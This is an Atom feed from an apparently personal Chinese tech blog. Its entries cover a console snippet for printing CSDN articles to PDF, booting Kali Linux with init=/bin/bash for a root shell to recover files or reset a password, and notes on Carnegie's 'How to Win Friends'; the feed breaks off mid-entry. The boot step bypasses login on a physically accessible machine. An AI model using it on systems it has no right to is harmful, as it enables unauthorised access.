<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sqrt7</title>
  
  
  <link href="https://w-sqrt7.github.io/atom.xml" rel="self"/>
  
  <link href="https://w-sqrt7.github.io/"/>
  <updated>2024-11-23T04:02:26.427Z</updated>
  <id>https://w-sqrt7.github.io/</id>
  
  <author>
    <name>sqrt7</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows渗透测试中常用命令</title>
    <link href="https://w-sqrt7.github.io/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/"/>
    <id>https://w-sqrt7.github.io/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/</id>
    <published>2024-11-23T03:29:39.311Z</published>
    <updated>2024-11-23T04:02:26.427Z</updated>
    
    <content type="html"><![CDATA[<h1 id="互联网文章下载"><a href="#互联网文章下载" class="headerlink" title="互联网文章下载"></a>互联网文章下载</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在互联网上，总会有些技术文章等，让人看得眼前一亮，想要扒下来存着，方便以后使用，但是苦恼于一直无法获取源文件，所以最开始，在我啥都不懂的时候，dump文章基本上都是靠ctrl+c和ctrl+v来操作的，但是弄下来之后排版问题基本上可以说的上是惨不忍睹，这又要自己花费大量的时间去修改整理，总之很费劲，但到了如今，对计算机的使用也是越发的熟练，也就准备写一份这样的文章，记录一下，同时纪念一下曾经那个有些蠢笨的自己。</span><br></pre></td></tr></table></figure><h2 id="1-普通站点文章"><a href="#1-普通站点文章" class="headerlink" title="1.普通站点文章"></a>1.普通站点文章</h2><p>大部分网站还是比较好操作的，直接ctrl+p或浏览器右上角进行页面打印就可以，打印为pdf文件，后续在利用格式工厂或其他工具转为其他格式，看个人需求。</p><p><img src="/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/image-20241123114111667.png" alt="image-20241123114111667"></p><p><img src="/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/image-20241123113928907.png" alt="image-20241123113928907"></p><h2 id="2-CSDN博客文章"><a href="#2-CSDN博客文章" class="headerlink" title="2.CSDN博客文章"></a>2.CSDN博客文章</h2><p>在CSDN上面下载文章相对麻烦一些，首先打开控制台，输入给出的代码并回车，然后会自动弹出打印窗口，有的时候会出现卡边的情况，这里要根据实际情况，修改一下纵横方向，纸张大小，缩放比例等。</p><p>当然也有一些个人博客等比较麻烦的，根据实际情况修改代码或其他设置即可。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;#side&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">    $(<span class="string">&quot;#comment_title, #comment_list, #comment_bar, #comment_form, .announce, #ad_cen, #ad_bot&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">    $(<span class="string">&quot;.nav_top_2011, #header, #navigator&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">    $(<span class="string">&quot;.p4course_target, .comment-box, .recommend-box, #csdn-toolbar, #tool-box&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">    $(<span class="string">&quot;aside&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">    $(<span class="string">&quot;.tool-box&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">    $(<span class="string">&quot;#toolBarBox&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">    $(<span class="string">&quot;main&quot;</span>).<span class="title function_">css</span>(<span class="string">&#x27;display&#x27;</span>,<span class="string">&#x27;content&#x27;</span>); </span><br><span class="line">    $(<span class="string">&quot;main&quot;</span>).<span class="title function_">css</span>(<span class="string">&#x27;float&#x27;</span>,<span class="string">&#x27;left&#x27;</span>);</span><br><span class="line">    $(<span class="string">&quot;.option-box&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">    $(<span class="string">&quot;body&quot;</span>).<span class="title function_">css</span>(<span class="string">&#x27;min-width&#x27;</span>,<span class="number">0</span>);</span><br><span class="line">    $(<span class="string">&quot;.option-box&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">print</span>();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/image-20241123115204137.png" alt="image-20241123115204137"></p><p><img src="/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/image-20241123115138233.png" alt="image-20241123115138233"></p><h2 id="3-微信公众号文章"><a href="#3-微信公众号文章" class="headerlink" title="3.微信公众号文章"></a>3.微信公众号文章</h2><p>打开公众号文章，想方设法用浏览器打开，然后就是直接页面打印就行了</p><p><img src="/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-23%20115654.png" alt="屏幕截图 2024-11-23 115654"></p><p><img src="/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/image-20241123115920720.png" alt="image-20241123115920720"></p><p><img src="/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/image-20241123120008767.png" alt="image-20241123120008767"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;互联网文章下载&quot;&gt;&lt;a href=&quot;#互联网文章下载&quot; class=&quot;headerlink&quot; title=&quot;互联网文章下载&quot;&gt;&lt;/a&gt;互联网文章下载&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl</summary>
      
    
    
    
    <category term="计算机基础知识" scheme="https://w-sqrt7.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="转载" scheme="https://w-sqrt7.github.io/tags/%E8%BD%AC%E8%BD%BD/"/>
    
    <category term="基础" scheme="https://w-sqrt7.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Windows渗透测试中常用命令</title>
    <link href="https://w-sqrt7.github.io/2024/09/21/other/basic/kali%E4%BD%BF%E7%94%A8%E5%8D%95%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F/"/>
    <id>https://w-sqrt7.github.io/2024/09/21/other/basic/kali%E4%BD%BF%E7%94%A8%E5%8D%95%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F/</id>
    <published>2024-09-21T11:40:45.518Z</published>
    <updated>2024-11-23T03:28:42.431Z</updated>
    
    <content type="html"><![CDATA[<h3 id="使用单用户模式"><a href="#使用单用户模式" class="headerlink" title="使用单用户模式"></a>使用单用户模式</h3><p>如果你可以以单用户模式登录，可以尝试从单用户模式恢复文件。</p><ol><li><p><strong>重启系统</strong>： 重启你的计算机。</p></li><li><p><strong>进入 GRUB 菜单</strong>： 在启动过程中，当GRUB菜单出现时，选择 “Advanced options for Kali Linux”。在启动过程中，当GRUB（GRand Unified Bootloader）菜单出现时，选择你通常启动的Kali Linux内核条目，但不要按回车键进入。</p></li><li><p><strong>编辑启动选项</strong>： 在高亮显示的内核条目上，按<code>e</code>键编辑启动选项。</p></li><li><p><strong>修改内核启动行</strong>： 使用上下箭头键找到以<code>linux</code>开头的那一行。在这一行的末尾，添加以下参数：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init=/bin/bash</span><br></pre></td></tr></table></figure><p>确保不要添加任何前缀空格，但要在现有的<code>ro</code>或其他参数后添加一个空格，然后再添加<code>init=/bin/bash</code>。</p></li><li><p><strong>进入单用户模式</strong>： 完成上述配置后按下<code>ctrl + X</code>或<code>F10</code>启动系统系统将启动到一个单用户模式的root shell。，。</p></li><li><p><strong>挂载文件系统为读写模式</strong>： 在单用户模式下，文件系统默认是只读的，需要重新挂载为读写模式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o remount,rw /</span><br></pre></td></tr></table></figure></li><li><p><strong>恢复原始文件或重置密码</strong>： 使用Live CD&#x2F;USB或其他方式获取原始文件，并替换更改的文件。你可以使用 <code>cp</code> 命令从Live环境复制文件到系统中。</p></li><li><p><strong>重启系统</strong>： 执行 <code>reboot -f</code> 命令重启系统。</p></li></ol><h3 id="检查文件系统状态"><a href="#检查文件系统状态" class="headerlink" title="检查文件系统状态"></a>检查文件系统状态</h3><p>首先，你需要检查文件系统的状态。运行以下命令来查看文件系统的挂载状态：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount | grep <span class="string">&quot; on / &quot;</span></span><br></pre></td></tr></table></figure><h3 id="重新挂载文件系统为读写模式"><a href="#重新挂载文件系统为读写模式" class="headerlink" title="重新挂载文件系统为读写模式"></a>重新挂载文件系统为读写模式</h3><p>如果文件系统被挂载为只读，你可以尝试重新挂载为读写模式。使用以下命令：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o remount,rw /</span><br></pre></td></tr></table></figure><p>这条命令会尝试重新挂载根文件系统为读写模式。如果成功，你可以再次尝试更改权限。</p><h3 id="检查文件系统错误"><a href="#检查文件系统错误" class="headerlink" title="检查文件系统错误"></a>检查文件系统错误</h3><p>如果文件系统被挂载为只读，可能是因为有未处理的错误。运行文件系统检查：</p><p>bash复制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fsck -f /</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;使用单用户模式&quot;&gt;&lt;a href=&quot;#使用单用户模式&quot; class=&quot;headerlink&quot; title=&quot;使用单用户模式&quot;&gt;&lt;/a&gt;使用单用户模式&lt;/h3&gt;&lt;p&gt;如果你可以以单用户模式登录，可以尝试从单用户模式恢复文件。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;str</summary>
      
    
    
    
    <category term="计算机基础知识" scheme="https://w-sqrt7.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="转载" scheme="https://w-sqrt7.github.io/tags/%E8%BD%AC%E8%BD%BD/"/>
    
    <category term="基础" scheme="https://w-sqrt7.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://w-sqrt7.github.io/2024/07/20/philosophy/%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9/"/>
    <id>https://w-sqrt7.github.io/2024/07/20/philosophy/%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9/</id>
    <published>2024-07-20T14:15:26.179Z</published>
    <updated>2024-07-20T14:16:14.713Z</updated>
    
    <content type="html"><![CDATA[<h1 id="人性的弱点"><a href="#人性的弱点" class="headerlink" title="人性的弱点"></a>人性的弱点</h1><h2 id="1-与人相处的基本技巧"><a href="#1-与人相处的基本技巧" class="headerlink" title="1.与人相处的基本技巧"></a>1.与人相处的基本技巧</h2><h3 id="永远不要批评斥责抱怨他人"><a href="#永远不要批评斥责抱怨他人" class="headerlink" title="永远不要批评斥责抱怨他人"></a>永远不要批评斥责抱怨他人</h3><p>无论一个人犯了何种错误，第一反应永远不会是自责</p><p>批评斥责只会伤害其自尊，引起强烈的反抗</p><p>人类的天性，只会责怪别人，不会责怪自己，每个人都是如此</p><p>批评他人很容易给自己引来麻烦</p><h3 id="真诚的赞美他人"><a href="#真诚的赞美他人" class="headerlink" title="真诚的赞美他人"></a>真诚的赞美他人</h3><p>若希望一个人按照你的要求做事，最好的方法就是满足他的需求</p><p>对任何人来讲，赞美都比批评更有效，更容易激发对方的热情</p><p>所有人都喜欢别人恭维自己，在人类的天性中，最深层的本质就是渴望得到别人的重视和关注</p><p>赞美不同于谄媚，谄媚如假钞，赞美如甘露，基于真诚的赞美</p><p>发现别人的优点真诚的赞美他人</p><h3 id="激发他人的强烈需求"><a href="#激发他人的强烈需求" class="headerlink" title="激发他人的强烈需求"></a>激发他人的强烈需求</h3><p>唯一能够影响他人的方法就是讨论他的需求，然后告诉他如何才能满足这种需求</p><p>掌握对方迫切的需求便能如鱼得水，事半功倍</p><p>钓人如钓鱼，要投其所好，挂上鱼儿喜欢吃的东西</p><p>每个人都值关心自己的需求，对他人的需求并不感兴趣，讨论他的需求，然后告诉他如何才能满足这种需求</p><p>站在对方的立场考虑问题，抓住对方的需求</p><h2 id="2-如何让他人喜欢你"><a href="#2-如何让他人喜欢你" class="headerlink" title="2.如何让他人喜欢你"></a>2.如何让他人喜欢你</h2><h3 id="真诚的关心"><a href="#真诚的关心" class="headerlink" title="真诚的关心"></a>真诚的关心</h3><p>一个人通过真诚测关心他人，即便是最忙碌的著名人士，依然能够占用他们的时间，获得与他们合作的机会</p><p>无论是知名人士还是普通人，大家都喜欢尊重自己的人</p><h3 id="微笑待人"><a href="#微笑待人" class="headerlink" title="微笑待人"></a>微笑待人</h3><p>人际交往中，真正发自内心的微笑有着很重要的作用</p><p>爱微笑的人往往比不爱微笑的人更受欢迎</p><h3 id="记住他人的名字"><a href="#记住他人的名字" class="headerlink" title="记住他人的名字"></a>记住他人的名字</h3><p>每个人都很重视自己的名字，所以记住别人的名字，是一种礼貌，不仅能获得别人的好感，还能让你有意想不到的收获</p><p>无论在商业中还是政治中，牢记他人的名字都是很重要的事情</p><p>牢牢记住所接触的每一个人的名字</p><h3 id="善于倾听他人讲话"><a href="#善于倾听他人讲话" class="headerlink" title="善于倾听他人讲话"></a>善于倾听他人讲话</h3><p>如果想要获得别人的好感，善于倾听对方讲话时很重要的事情，这是对他的最高恭维</p><p>不认真听别人讲话，而是不断谈论自己的事情，只会让别人厌恶你，轻视你</p><p>不要打断别人的话，注意听对方说话的重点，适当发表自己的意见，关注他人的需求，忽略自己的感受与</p><h3 id="谈论他人的兴趣"><a href="#谈论他人的兴趣" class="headerlink" title="谈论他人的兴趣"></a>谈论他人的兴趣</h3><p>最容易接近别人心灵的方法就是谈论他人感兴趣的话题，这可以让自己成为一个深受欢迎的人</p><p>拓宽自己的知识面，增加自己与他人谈论的接触面</p><p>谈论对方感兴趣的话题，要适当发表自己的意见，保证自己说出的信息是准确的</p><p>不要刻意的讨论对方感兴趣的事情，而是在无意间提起，如果刻意，只会引起反效果</p><p>真诚的表现出自己的兴趣，对于有用的人，越是值得接近的人，越努力的研究他人的兴趣，并牢记这些知识，以便深入交谈</p><h3 id="满足他人的自重感"><a href="#满足他人的自重感" class="headerlink" title="满足他人的自重感"></a>满足他人的自重感</h3><p>人际交往中的重要法则，尊重别人，让对方获得自重感</p><p>人类最深层的欲望就是得到别人的重视</p><p>己所不欲勿施于人，己所欲者亦施于人</p><h2 id="3-如何赢得他人的赞同"><a href="#3-如何赢得他人的赞同" class="headerlink" title="3.如何赢得他人的赞同"></a>3.如何赢得他人的赞同</h2><h3 id="不要与他人争论"><a href="#不要与他人争论" class="headerlink" title="不要与他人争论"></a>不要与他人争论</h3><p>喜欢和别人争论，反驳别人的观点，可能赢得一时的胜利，但这毫无价值，永远无法获得对方的好感</p><p>避免争论往往能获得最大的胜利</p><h3 id="永远不要指责他人的错误"><a href="#永远不要指责他人的错误" class="headerlink" title="永远不要指责他人的错误"></a>永远不要指责他人的错误</h3><p>即便你比他人聪明，也绝对不能告诉对方你比他聪明</p><p>承认自己的错误之处，不仅能避免争论，还能让对方同样“大度”</p><p>即便你指出别人的错误，对方也不一定会认同你，同时还会引起对方的反抗，即便与他辩论，讲道理，依旧无法改变他的观点，因为你对他的自尊造成了伤害</p><h3 id="用于承认自己的错误"><a href="#用于承认自己的错误" class="headerlink" title="用于承认自己的错误"></a>用于承认自己的错误</h3><p>承认自己可能的错误，能够避免与人争论，还有利于解决问题，更容易达到目的</p><p>如果你是对的，使用相对温和的语气让对方赞同你的观点，使用巧妙的方式让别人赞同我们的观点</p><h3 id="善待他人"><a href="#善待他人" class="headerlink" title="善待他人"></a>善待他人</h3><p>每个人都有自己的想法，且很难强迫他们改变自己的想法来赞同你的观点</p><p>如果想让别人赞同你的观点，就需要友善的对待他，让他相信你真正的将他当作朋友</p><p>友善待人，用温和的态度赢得别人的心</p><h3 id="站在对方的立场思考问题"><a href="#站在对方的立场思考问题" class="headerlink" title="站在对方的立场思考问题"></a>站在对方的立场思考问题</h3><p>在与人交往时，不要将自己的观点强加给别人，而是从对方的立场思考问题</p><p>只有从别人的角度看问题，了解对方的思想，才能在为人处世中创造奇迹，获得对方好感</p><p>不要牢记别人的错误，不要轻易的职责别人，只有傻子才会那样做</p><p>对方的所言所行有他自己的道理，如果能找到那个原因，便掌握了理解他们的钥匙</p><p>尝试思考：如果我是他，我会有什么感受，又会做出何种反应</p><p>站在对方的角度思考，有什么理由能够让他这样做</p><h3 id="充分理解他人的感受"><a href="#充分理解他人的感受" class="headerlink" title="充分理解他人的感受"></a>充分理解他人的感受</h3><p>有一句神奇的话：我一点也不奇怪你有那样的感受，如果我是你的话，我的感受也是一样的</p><p>在消除他人的恶感时，感同身受有着很重要的作用</p><p>相互理解时困难的，不能理解才是正常的</p><h2 id="4-如何改变他人的观点"><a href="#4-如何改变他人的观点" class="headerlink" title="4.如何改变他人的观点"></a>4.如何改变他人的观点</h2><h3 id="强调彼此的共同点"><a href="#强调彼此的共同点" class="headerlink" title="强调彼此的共同点"></a>强调彼此的共同点</h3><p>如果你一开始就赞同对方的观点，便会营造一种和谐的谈话气氛，有利于实现你的目标。这时候，对方也容易放弃自己的偏见，转而赞同你的意见。</p><p>如果想要让对方赞同你的观点，你需要做的是抓住谈话的共同点，然后强调这个共同点</p><p>让一个人想要做某件事的方法是，让他认为你的说法是正确的，他是在做正确的事情。</p><p>当你在说服别人时，如果能让对方在一开始就回答“是”，那么，你就成功了一半；如果能够引导看对方一直回答“是”，那么，你就成功了90%</p><p>如果在谈话中，对方一开始就说“不”，即使你说得再多，依然很难改变他的观点。这时候，你需要做的是改变话题，或者改变谈话方式。先讨论双方都赞同的话题，然后逐渐进入有分的部分，在分岐中寻找双方都能接受的部分，慢慢减少彼此之间的分，最后说服对方。</p><p>说服对方的过程中注意以下两点：</p><pre><code>#第一，提问的方式哪种提问方式更容易得到肯定的回答呢？最好是带有暗示性的方式。例如，当推销员向顾客推销某个商品时，如果问顾客“喜不喜欢”或者“想不想要”，便很可能得到否定的回答。如果推销员说：“你一定很喜欢这个东西，是吗？这样获得肯定回答的几率就会高很多。#第二，提问的内容除了提问的方式之外，提问的内容也是非常重要的。例如，推销员询问顾客“今天的天气很好，是吗？”“最近的通货膨胀很严重，治安很混乱，是吗？等问题，虽然都能得到肯定的回答，但无法创造出和谐的谈话气氛，甚至会让顾客觉得庆烦。这样一来，肯定无法实现自己的目的了。</code></pre><p>当我们在说服对方时，一定要想办法让对方回答“是”，引领着他一步步靠近我们的观点因此</p><p>强调彼此的共同点，寻找让对方回答“是”的问题。</p><h3 id="给予他人说话的机会"><a href="#给予他人说话的机会" class="headerlink" title="给予他人说话的机会"></a>给予他人说话的机会</h3><p>如果想要说服他人，便努力为对方创造说话的机会</p><p>即使是最顽固的人，当你耐心地倾听他说话时，他的态度也会逐渐地软化下来</p><p>为了让他人赞同自己的观点，许多人都容易犯相同的错误：说话太多。</p><h3 id="先称赞，后责备"><a href="#先称赞，后责备" class="headerlink" title="先称赞，后责备"></a>先称赞，后责备</h3><p>当我们听完别人的称赞之后，再去听别人的批评，心里也会好受一些。</p><p>如果用争论的方法不能说服对方，你可以尝试一下称赞的方法，或许会让对方放弃自己的观点，转而接受你的观点。</p><h3 id="鼓励更容易让人改正错误"><a href="#鼓励更容易让人改正错误" class="headerlink" title="鼓励更容易让人改正错误"></a>鼓励更容易让人改正错误</h3><p>当你告诉孩子、丈夫或者员工，他在某件事情上毫无天分，无论付出多少努力都无法成功时，你就打破了他的上进心如果你鼓励他、支持他，他就会有信心完成你的要求</p><p>任何人都会犯错误，但每个人都喜欢被表扬，而不喜欢被批评。只要被批评就会产生消极情绪，而获得表扬就会信心十足。因此，在指出<br> 别人的错误时需要一定的技巧。</p><p>一般来说，我们 要尽量委婉地指出别人的错误，避免直接的批评和攻击，否则不仅无法使对方意识到所犯的错误，还会使他产生逆反心理，难以接受你的批评。最好是用鼓励和赞赏的方法指出别人的错<br>误，让对方容易接受，而且不会产生逆反心理。</p><h3 id="委婉的指出他人的错误"><a href="#委婉的指出他人的错误" class="headerlink" title="委婉的指出他人的错误"></a>委婉的指出他人的错误</h3><p>任何人在面对直接的批评时，都会产生强烈的反感；如果能够巧妙地让他人意识到自己的错误，并给出建议的话对方就会很乐意接受</p><p>当你希望别人满足你的期望时，在赞扬他之后，千万不要说“但是”，而是要说“而且”，这两个词能够产生截然不同的效果。</p><h3 id="先责己，后责人"><a href="#先责己，后责人" class="headerlink" title="先责己，后责人"></a>先责己，后责人</h3><p>即使一个人还没有改正自己的错误，但只要能够认识到自己的错误，便有助于帮助他改善自己的行为。</p><p>如果批评者首先承认自己的错误，然后再指责他人的错误，那么，情况就会好很多。</p><h2 id="5-如何激励他人的行为"><a href="#5-如何激励他人的行为" class="headerlink" title="5.如何激励他人的行为"></a>5.如何激励他人的行为</h2><h3 id="激发他人高尚的动机"><a href="#激发他人高尚的动机" class="headerlink" title="激发他人高尚的动机"></a>激发他人高尚的动机</h3><p>所有人都是理想主义者，都希望自己所做的事情有一个动听的理由。因此，如果你能激发出他人的高尚动机，便很容易实现自己的目标。</p><p>即使是那些有意欺骗你的人，如果你能让他相信他是一个诚实、善良、正直的人，在大多数情况下，他都会朝着这个目标努力，达成你的期望</p><h3 id="激发他人竞争的欲望"><a href="#激发他人竞争的欲望" class="headerlink" title="激发他人竞争的欲望"></a>激发他人竞争的欲望</h3><p>竞争意识存在于强烈的自重感中，这是一个人不甘落后于人的最佳体现。</p><p>每一个成功的人士都喜欢竞争，因为这是他表现自己的机会，更是证明他的能力和价值的平台</p><p>无论是在生物界，还是在人类社会中，都存在着竞争。只要目的和方式都正当的竞争，便有利于增强人们的能力，从而提高效率</p><h3 id="称赞他人的进步"><a href="#称赞他人的进步" class="headerlink" title="称赞他人的进步"></a>称赞他人的进步</h3><p>如果我们愿意激励所接触到的每一个人，帮助他挖掘出内在的潜力，那么，不仅能够使其进步，甚至会改变他的一生。</p><p>称赞对方的进步，即使是微不足道的进步，对方也会铭记在心，并激励着自己走向成功</p><p>所有人都渴望得到称赞和认同，而且会尽力得到它，但几乎没有人喜欢阿奉承</p><h3 id="让他人拥有一个好名声"><a href="#让他人拥有一个好名声" class="headerlink" title="让他人拥有一个好名声"></a>让他人拥有一个好名声</h3><p>如果你希望某个人拥有一种美德，你可以公开宣称他已经拥有这种美德了，尽管他确实没有。给他一个好名声，让他为此去奋斗，他就会竭尽全力去做，绝对不想令你失望</p><p>对于普通人来说，如果他能够尊重你，而你也对他的某种能力表示肯定，那么，他就愿意服从你的命令。</p><p>如果你希望一个人在某方面有所改变，必须承认他在这方面已经很优秀了。莎士比亚曾说：“如果你没有一种美德你必须认为自己已经有了。</p><p>在心理学中的期待效应”，是指我们在人际交往中，如果想要让对方达到某个目标，必须对对方寄予某种期望，还要用语言将这种期望表示出来，让对方知道你的期望，这样能够让对方更容易达成目标。</p><p>有句古语说：“如果人背了恶名，还不如一死了之。无论是穷人、富人，还是、强盗，所有人都希望自己有一个好名声</p><h3 id="善于向他人授权"><a href="#善于向他人授权" class="headerlink" title="善于向他人授权"></a>善于向他人授权</h3><p>如果你希望别人高高兴兴地去做你让他做的事情，那么，你就需要让他明白，他对你来说是很重要的。这样一来，他也会认为自己是无可替代的，从而满足你的要求。</p><p>当你对他人有所求时，你可以采用委婉、欣赏的方式这样他更容易答应你的请求。</p><p>人类的自重感是为了满足本性的需求，由内部自重和外部自重两部分组成。内部自重指的是每个人都希望拥有实力、充满自信、独立自主，也就是我们所谓的自尊；外部自重指的是人们对于社会地位、自身威望的渴求，希望能够得到他人的尊重和信任。</p><p>从个人心理学角度来说，当一个人被授予某种头衔时，他对自己的认知就会发生变化。在潜意识中，他会将自己与头衔联系在一起，按照头衔的要求做事，否则他的认知就会失调，也就是认识与言行之间产生矛盾冲突，从而觉得很不适应。因此，为了避免这种情况，他一定会用实际行动维护这个头街带给自己的荣誉</p><h3 id="真诚地请求他人帮忙"><a href="#真诚地请求他人帮忙" class="headerlink" title="真诚地请求他人帮忙"></a>真诚地请求他人帮忙</h3><p>每一个人都希望被人欣赏、被人尊重，甚至会使用各种方法实现这个目标。</p><p>请求别人为你做事，不仅能够让对方产生自重、高贵的感觉，还能激发出对方的创造力，让你拥有意想不到的收获。</p><p>在这里，我需要强调一点，有些人会机械地运用这个规则。虽然我们需要激发出对方的自重感和高贵感，但不是通过馅媚或者虚伪的方式，如果出发点是错误的，绝对不会产生理想的效果。</p><p>虽然每个人都希望得到他人的赞赏和尊重，但任何人都不会接受馅媚、虚伪的奉承。</p><h2 id="6-如何获得他人的好感"><a href="#6-如何获得他人的好感" class="headerlink" title="6.如何获得他人的好感"></a>6.如何获得他人的好感</h2><h3 id="被容纳是每个人的渴望"><a href="#被容纳是每个人的渴望" class="headerlink" title="被容纳是每个人的渴望"></a>被容纳是每个人的渴望</h3><p>每个人都希望自己能够被他人接受，可以轻松地与他人相处，这是所有人内心的深切渴望</p><p>问候不仅是一种礼貌，也是一种安感，而且能够缩短人们之间的距离，让人与人之间的关系更加紧密。因此，问候是表达友善的一种方式。</p><p>给身边的人送去问候，不仅打开了自己尘封的心灵，也会给别人带来温暖。问候是一种礼貌，也是一种安感，能够缩短人们之间的距离，让人们更加亲密。因此，问候是表达友善的一种方式。</p><h3 id="学会尊重他人"><a href="#学会尊重他人" class="headerlink" title="学会尊重他人"></a>学会尊重他人</h3><p>每个人都会维护自己的尊严，给予他一种自重感，他就会忠诚于你，而不会背叛。</p><p>无礼的命令只会招来他人的恨，即使这种命令能够改正他人的错误。</p><p>任何人都有自尊心，所以你在维护自己的自尊心时，千万不能伤害到他人的自尊心。尊重是相互的，只有尊重别人，才能够得到别人的尊重。</p><p>人类是一种奇怪的动物，而且有着强烈的自尊心，他们可以在暗地里吃亏，也可以在明面上吃亏，但就是不能在自尊心上吃亏</p><p>如果想要对他人产生影响的话，一定要学会从对方的角度考虑问题，满足对方的自尊心。这样，对方才会去做你希望他做的事情，而且不会背你。</p><h3 id="请求别人批评自己"><a href="#请求别人批评自己" class="headerlink" title="请求别人批评自己"></a>请求别人批评自己</h3><p>每个人每天至少有五分钟是一个大笨蛋，所谓的智慧就是如何不超过这五分钟的限制</p><p>那些反对你、指责你、阻碍你的人都是你的导师，你可以从他们那里学到更多的定西。</p><p>既然每个人都会做错事和事，为什么要在意别人的批评呢<br>愚蠢的人受到批评时会反、发气，但聪明人会从批评者身上学到自己没有的东西。</p><p>著名诗人惠特曼曾说：“难道你只会从慕你、恭维你的人身上学习知识吗？那些反对你、批评你、指责你的人不是能让你学到更多吗？”罗契方卡也说：“敌人的意见要比我们自己的意见更加接近事实。</p><h3 id="拥抱对手"><a href="#拥抱对手" class="headerlink" title="拥抱对手"></a>拥抱对手</h3><p>如果我们的对手知道他们能够让我们伤心、烦恼的话他们一定会很开心，因为这种痛苦无法伤害他们，但会伤害我们自己。</p><p>我们要学着关爱自己的对手，这样不仅能够化干戈为玉，赢得对手的好感，还会给自己带来快乐</p><p>莎士比亚曾说：“不要让你的对手在你心中点燃一把火，则烧伤得只能是你自己。“</p><h3 id="人的本性是容易忘记感恩"><a href="#人的本性是容易忘记感恩" class="headerlink" title="人的本性是容易忘记感恩"></a>人的本性是容易忘记感恩</h3><p>忘记感谢是人的本性，假如我们一直期望别人感恩的话，大多数都是自寻烦恼。</p><p>想要获得真正的快乐， 就必须抛弃别人会不会感激你的念头，只享受付出的快乐。</p><p>我们不要试着指望别人报答，当偶尔得到了别人的感激的时候，就会是一种惊喜，而得不到也不会为此难过。</p><h2 id="7-如何让你变得更加成熟"><a href="#7-如何让你变得更加成熟" class="headerlink" title="7.如何让你变得更加成熟"></a>7.如何让你变得更加成熟</h2><h3 id="勇于承担责任"><a href="#勇于承担责任" class="headerlink" 